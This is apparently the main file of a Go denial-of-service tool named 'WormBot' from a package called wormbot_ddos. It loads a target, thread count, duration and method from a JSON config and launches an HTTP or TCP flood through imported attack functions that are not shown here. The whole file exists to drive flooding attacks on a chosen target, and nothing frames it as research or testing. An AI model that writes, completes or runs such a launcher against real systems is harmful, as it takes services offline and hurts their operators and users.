package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"os"
	"os/signal"
	"syscall"
	"wormbot_ddos/attack"
)

type Config struct {
	Target   string `json:"target"`
	Threads  int    `json:"threads"`
	Duration int    `json:"duration"`
	Method   string `json:"method"` // http, tcp
}

func main() {
	configFile := flag.String("config", "config.json", "Config file path")
	flag.Parse()

	file, _ := os.Open(*configFile)
	defer file.Close()
	var cfg Config
	json.NewDecoder(file).Decode(&cfg)

	fmt.Printf("🐛 WormBot activated | Target: %s | Method: %s | Threads: %d | Duration: %ds\n",
		cfg.Target, cfg.Method, cfg.Threads, cfg.Duration)

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-sigChan
		fmt.Println("\n⚠️ Kill signal received. Worms retreating...")
		os.Exit(0)
	}()

	if cfg.Method == "http" {
		attack.HTTPFlood(cfg.Target, cfg.Threads, cfg.Duration)
	} else if cfg.Method == "tcp" {
		attack.TCPFlood(cfg.Target, cfg.Threads, cfg.Duration)
	} else {
		fmt.Println("Unknown method. Use 'http' or 'tcp'")
	}
}
